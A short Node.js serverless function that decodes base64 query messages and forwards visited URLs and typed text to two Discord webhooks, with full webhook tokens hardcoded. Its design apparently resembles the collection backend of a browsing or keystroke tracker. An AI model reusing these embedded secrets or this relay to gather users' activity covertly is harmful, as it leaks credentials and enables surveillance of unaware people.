module.exports = async (req, res) => {
  const encodedMessage = req.query.message;

  if (encodedMessage) {
    try {
      const decodedMessage = atob(encodedMessage);
      const messageParts = decodedMessage.split(": ");
      
      let webhookUrl;

      // Check if the message is a website visit or a typed message
      if (decodedMessage.includes('Visited:')) {
        const fullUrl = messageParts[1];
        webhookUrl = 'https://discord.com/api/webhooks/1344439171258912788/1d-8GDD3yJO2JBTmAtGnS1UDGG-eBF5Hfr4g4mSroD4V21aCCTMzi4fBvzqmNpZlwMMP'; // Website visit webhook
        const discordPayload = {
          content: `Website Visited: ${fullUrl}`,
        };

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(discordPayload),
        });

        if (response.ok) {
          res.status(200).json({ message: 'Message sent to Discord webhook successfully!' });
        } else {
          res.status(500).json({ error: 'Failed to send message to Discord webhook' });
        }
      } else if (decodedMessage.includes('Message:')) {
        const typedMessage = messageParts[1];
        webhookUrl = 'https://discord.com/api/webhooks/1344486784985333922/mqNWryn4OUI6oLFpvblRKzVCBb0BhXPferXpGLN6oy3tHQOf2O40bS6KhZh0OrWpzB6S'; // Typed message webhook
        const discordPayload = {
          content: `Message: ${typedMessage}`,
        };

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(discordPayload),
        });

        if (response.ok) {
          res.status(200).json({ message: 'Message sent to Discord webhook successfully!' });
        } else {
          res.status(500).json({ error: 'Failed to send message to Discord webhook' });
        }
      } else {
        res.status(400).json({ error: 'Invalid message format' });
      }
    } catch (error) {
      res.status(500).json({ error: 'Failed to decode Base64 message' });
    }
  } else {
    res.status(400).json({ error: 'No message provided' });
  }
};
